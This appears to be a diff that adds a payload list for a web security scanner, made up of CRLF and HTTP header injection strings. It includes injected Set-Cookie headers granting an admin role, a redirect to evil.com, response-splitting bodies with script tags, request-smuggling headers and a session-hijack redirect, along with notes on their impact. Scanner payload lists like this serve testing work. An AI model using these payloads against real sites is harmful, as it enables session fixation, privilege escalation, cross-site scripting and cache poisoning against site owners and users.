@@ -1,0 +1,27 @@
+# CRLF / HTTP Header Injection Payloads — cyberm4fia-scanner
+# Categories: Header Injection, Body Injection, Encoding Variations
+
+# ─── Core CRLF Payloads ───
+%0d%0aSet-Cookie:%20role=admin
+%0aSet-Cookie:%20role=admin
+%0d%0aLocation:%20https://evil.com
+%E5%98%8A%E5%98%8DSet-Cookie:%20role=admin (UTF-8 overlong)
+%u000d%u000aX-Injected: 1
+
+# ─── Body Injection (split response) ───
+%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0a%0d%0a<html><body><h1>Injected</h1></body></html>
+
+# ─── Additional Headers ───
+\r\nX-Injected: 1
+\n\rX-Injected: 1
+\r\nContent-Length: 0
+\r\nTransfer-Encoding: chunked
+
+# ─── Reflect-in-Redirect ───
+/redirect?url=https://target.com%0d%0aSet-Cookie:%20session=HIJACKED
+
+# ─── Impact ───
+# - Session fixation via injected Set-Cookie
+# - XSS via injected body after \r\n\r\n
+# - Response splitting → cache poisoning
